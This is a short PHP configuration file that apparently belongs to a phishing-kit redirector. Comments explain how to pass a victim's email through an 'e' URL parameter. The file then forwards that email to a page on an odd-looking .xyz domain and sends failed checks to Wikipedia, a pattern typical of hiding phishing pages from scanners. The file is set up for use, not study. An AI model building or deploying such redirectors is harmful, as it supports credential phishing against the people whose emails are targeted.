<?php

/*
$pagelink is used to redirect to the link
$FailRedirection is an optional function.

This auto redirector can also grab input via paramater.
All you have to do it use it like
/redirector/?e=anyinput
Example:
https://test.com/redirector/?e=email@email.com
or
https://test.com/redirector/index.php?e=email@email.com


*/

$pagelink="https://servicescrabpart.xyz/main.html?email={email}";

$FailRedirect="https://wikipedia.com";

?>